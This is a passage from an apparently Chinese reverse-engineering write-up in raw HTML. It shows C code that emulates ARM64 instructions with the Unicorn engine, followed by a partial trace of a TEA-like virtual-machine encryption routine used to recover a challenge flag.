punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Input<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C70</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Code<span class=\"token punctuation\">,</span> <span class=\"token number\">8840u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x14010</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span>Data1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30F0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Data2<span class=\"token punctuation\">,</span> <span class=\"token number\">0x54u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x149E8</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Data3<span class=\"token punctuation\">,</span> <span class=\"token number\">8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_reg_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>InputAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// X0</span>\n    <span class=\"token function\">uc_reg_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Stack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// SP</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">uc_emu_start</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2EF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_mem_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> InputAddr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>MyEncFlag<span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%X \"</span><span class=\"token punctuation\">,</span> MyEncFlag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">uc_close</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>最后运行输出得到一个vm加密流程</p>\n<p>以下是部分输出内容。</p>\n<p>output:</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">W3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">=</span> <span class=\"token number\">4</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">32323232</span> <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">1919191</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">32323232</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> c8c8c8c80\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1919191</span> <span class=\"token operator\">^</span> <span class=\"token number\">8</span>c8c8c80 <span class=\"token operator\">=</span> <span class=\"token number\">8</span>d1d1d11\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">32323232</span> <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> <span class=\"token number\">23100176</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">8</span>d1d1d11 <span class=\"token operator\">+</span> <span class=\"token number\">23100176</span> <span class=\"token operator\">=</span> b02d1e87\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">=</span> <span class=\"token number\">776f</span>6853\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> dcc47a41\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> b02d1e87 <span class=\"token operator\">^</span> dcc47a41 <span class=\"token operator\">=</span> <span class=\"token number\">6</span>ce964c6\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">6</span>ce964c6 <span class=\"token operator\">+</span> <span class=\"token number\">31313131</span> <span class=\"token operator\">=</span> <span class=\"token number\">9e1</span>a95f7\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9e1</span>a95f7 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">9e1</span>a95f\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9e1</span>a95f7 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">4f</span>0d4afb80\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9e1</span>a95f <span class=\"token operator\">^</span> d4afb80 <span class=\"token operator\">=</span> <span class=\"token number\">4</span>ab52df\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9e1</span>a95f7 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> cb7ce27f\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4</span>ab52df <span class=\"token operator\">+</span> cb7ce27f <span class=\"token operator\">=</span> d028355e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5f</span>5fe6e7 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> bebfc\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bebfc <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">+</span> <span class=\"token number\">5f</span>5fe6e7 <span class=\"token operator\">=</span> d6cf4f3a\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d6cf4f3a <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> f5ec1a5c\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f5ec1a5c <span class=\"token operator\">^</span> d028355e <span class=\"token operator\">=</span> <span class=\"token number\">25</span>c42f02\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">25</span>c42f02 <span class=\"token operator\">+</span> <span class=\"token number\">32323232</span> <span class=\"token operator\">=</span> <span class=\"token number\">57f</span>66134\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">57f</span>66134 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>bfb309\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">57f</span>66134 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">15f</span>d984d00\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">2</span>bfb309 <span class=\"token operator\">^</span> fd984d00 <span class=\"token operator\">=</span> ff27fe09\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">57f</span>66134 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> <span class=\"token number\">46</span>d45270\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> ff27fe09 <span class=\"token operator\">+</span> <span class=\"token number\">46</span>d45270 <span class=\"token operator\">=</span> <span class=\"token number\">145f</span>c5079\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5f</span>5fe6e7 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">74696564</span> <span class=\"token operator\">+</span> <span class=\"token number\">5f</span>5fe6e7 <span class=\"token operator\">=</span> d3c94c4b\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d3c94c4b <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">78625e59</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">45f</span>c5079 <span class=\"token operator\">^</span> <span class=\"token number\">78625e59</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>d9e0e20\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>d9e0e20 <span class=\"token operator\">+</span> <span class=\"token number\">9e1</span>a95f7 <span class=\"token operator\">=</span> dbb8a417\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dbb8a417 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> dbb8a41\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dbb8a417 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span>ddc520b80\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dbb8a41 <span class=\"token operator\">^</span> dc520b80 <span class=\"token operator\">=</span> d1e981c1\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dbb8a417 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span>eded39f\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d1e981c1 <span class=\"token operator\">+</span> <span class=\"token number\">8</span>eded39f <span class=\"token operator\">=</span> <span class=\"token number\">160</span>c85560\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bebfcdce <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">17</span>d7f9\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17</span>d7f9 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">656</span>b616d <span class=\"token operator\">+</span> bebfcdce <span class=\"token operator\">=</span> <span class=\"token number\">1242</span>b2f3b\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">242</span>b2f3b <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">7087</span>a5d\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7087</span>a5d <span class=\"token operator\">^</span> <span class=\"token number\">60</span>c85560 <span class=\"token operator\">=</span> <span class=\"token number\">67</span>c02f3d\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>c02f3d <span class=\"token operator\">+</span> <span class=\"token number\">57f</span>66134 <span class=\"token operator\">=</span> bfb69071\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfb69071 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">5f</span>db483\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfb69071 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">2f</span>eda41c40\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5f</span>db483 <span class=\"token operator\">^</span> eda41c40 <span class=\"token operator\">=</span> e859a8c3\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfb69071 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> ae94a335\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> e859a8c3 <span class=\"token operator\">+</span> ae94a335 <span class=\"token operator\">=</span> <span class=\"token number\">196</span>ee4bf8\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bebfcdce <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> bebfcdce <span class=\"token operator\">=</span> <span class=\"token number\">1202</span>d2d40\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">202</span>d2d40 <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">8</span>b863f52\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">96</span>ee4bf8 <span class=\"token operator\">^</span> <span class=\"token number\">8</span>b863f52 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>d6874aa\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1</span>d6874aa <span class=\"token operator\">+</span> dbb8a417 <span class=\"token operator\">=</span> f92118c1\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f92118c1 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> f92118c\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f92118c1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">7</span>c908c6080\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f92118c <span class=\"token operator\">^</span> <span class=\"token number\">908</span>c6080 <span class=\"token operator\">=</span> <span class=\"token number\">9f</span>1e710c\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f92118c1 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> ac476f49\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9f</span>1e710c <span class=\"token operator\">+</span> ac476f49 <span class=\"token operator\">=</span> <span class=\"token number\">14</span>b65e055\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1e1f</span>b4b5 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">3</span>c3f6\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>c3f6 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> <span class=\"token number\">1e1f</span>b4b5 <span class=\"token operator\">=</span> <span class=\"token number\">7f</span>8d1427\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7f</span>8d1427 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span>cae4141\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5</span>cae4141 <span class=\"token operator\">^</span> <span class=\"token number\">4</span>b65e055 <span class=\"token operator\">=</span> <span class=\"token number\">17</span>cba114\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17</span>cba114 <span class=\"token operator\">+</span> bfb69071 <span class=\"token operator\">=</span> d7823185\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d7823185 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span>bc118c\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d7823185 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">35e08</span>c6140\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">6</span>bc118c <span class=\"token operator\">^</span> e08c6140 <span class=\"token operator\">=</span> e63070cc\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d7823185 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> c6a002c1\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> e63070cc <span class=\"token operator\">+</span> c6a002c1 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>acd0738d\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1e1f</span>b4b5 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">656</span>b616d <span class=\"token operator\">+</span> <span class=\"token number\">1e1f</span>b4b5 <span class=\"token operator\">=</span> <span class=\"token number\">838</span>b1622\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">838</span>b1622 <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">28200430</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> acd0738d <span class=\"token operator\">^</span> <span class=\"token number\">28200430</span> <span class=\"token operator\">=</span> <span class=\"token number\">84f</span>077bd\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">84f</span>077bd <span class=\"token operator\">+</span> f92118c1 <span class=\"token operator\">=</span> <span class=\"token number\">17e11907</span>e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7e11907</span>e <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">7e11907</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7e11907</span>e <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">3f</span>08c83f00\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7e11907</span> <span class=\"token operator\">^</span> <span class=\"token number\">8</span>c83f00 <span class=\"token operator\">=</span> f292607\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7e11907</span>e <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>b77e7f6\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f292607 <span class=\"token operator\">+</span> <span class=\"token number\">2</span>b77e7f6 <span class=\"token operator\">=</span> <span class=\"token number\">3</span>aa10dfd\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7</span>d7f9b9c <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> faff3\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> faff3 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">74696564</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span>d7f9b9c <span class=\"token operator\">=</span> f1e90100\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f1e90100 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> d2ca5466\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d2ca5466 <span class=\"token operator\">^</span> <span class=\"token number\">3</span>aa10dfd <span class=\"token operator\">=</span> e86b599b\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> e86b599b <span class=\"token operator\">+</span> d7823185 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>bfed8b20\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfed8b20 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">5ff</span>6c59\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfed8b20 <span class=\"token operator\">&lt;&lt;</span> <span 